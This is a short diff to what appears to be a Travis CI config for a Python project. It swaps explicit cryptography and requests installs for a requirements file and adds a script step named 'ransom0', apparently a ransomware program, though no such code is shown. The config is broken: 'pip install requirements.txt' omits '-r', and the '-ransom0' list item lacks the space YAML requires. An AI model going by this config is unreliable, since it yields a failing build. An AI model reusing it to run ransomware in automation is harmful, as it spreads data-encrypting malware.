@@ -3,4 +3,6 @@ python:
   - "3.8.7"
 # command to install dependencies
 install:
-  - pip install cryptography requests
+  - pip install requirements.txt
+script:
+  -ransom0
